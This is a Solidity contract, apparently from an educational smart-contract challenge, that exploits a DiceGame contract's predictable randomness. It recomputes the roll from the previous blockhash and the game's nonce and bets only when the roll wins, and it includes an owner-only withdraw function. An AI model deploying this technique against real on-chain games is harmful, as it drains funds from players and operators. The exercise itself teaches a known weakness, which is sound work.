pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	function withdraw() public onlyOwner {
		uint256 contractBalance = address(this).balance;
		(bool sent, ) = msg.sender.call{ value: contractBalance }("");
		require(sent, "Failed to withdraw funds");
	}

	function riggedRoll() public payable {
		require(address(this).balance > 0.002 ether, "Not enough ETH");
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;
		require(roll <= 2, "Not a winning roll");
		diceGame.rollTheDice{ value: 0.002 ether }();
	}

	receive() external payable {}
}
